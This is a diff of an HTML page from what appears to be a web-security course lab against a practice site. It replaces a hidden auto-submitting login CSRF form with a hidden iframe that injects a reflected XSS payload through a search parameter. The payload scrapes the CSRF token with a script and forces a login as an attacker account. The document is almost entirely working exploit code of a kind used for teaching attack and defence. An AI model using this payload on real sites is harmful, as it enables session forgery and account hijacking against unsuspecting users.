@@ -1,11 +1,5 @@
 <html>
-	<body onload="document.forms[0].submit()">
-		<iframe  name="invisframe" ></iframe>
-		<form action="http://bungle.cs.virginia.edu/login?csrfdefense=1&xssdefense=0" method="POST" target="invisframe">
-			<input type="hidden" name="csrf_token" value="ef1963c8002734930f2dfdad5446ad9f"/>
-			<input type="hidden" name="username" value="attacker" />
-			<input type="hidden" name="password" value="l33th4x" />
-			<input type="submit" style="display: none;" value="Login"/>
-		</form>
+	<body hidden>
+		<iframe hidden id='test' src="http://bungle.cs.virginia.edu/search?q=<form action='http://bungle.cs.virginia.edu/login?csrfdefense=1%26xssdefense=0' method='POST'><input type='hidden' name='csrf_token'><input type='hidden' name='username' value='attacker'/><input type='hidden' name='password' value='l33th4x'/><input type='submit' style='display: none;' value='Login'/></form><script>var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('GET', 'http://bungle.cs.virginia.edu/?csrfdefense=1%26xssdefense=0', true); req.send(); function handleResponse() { var token = this.responseText.match(/name='csrf_token' value='(\w%2b)'/)[1]; document.forms[1].elements['csrf_token'].value = token; document.forms[1].submit(); };</script>"></iframe>
 	</body>
 </html>
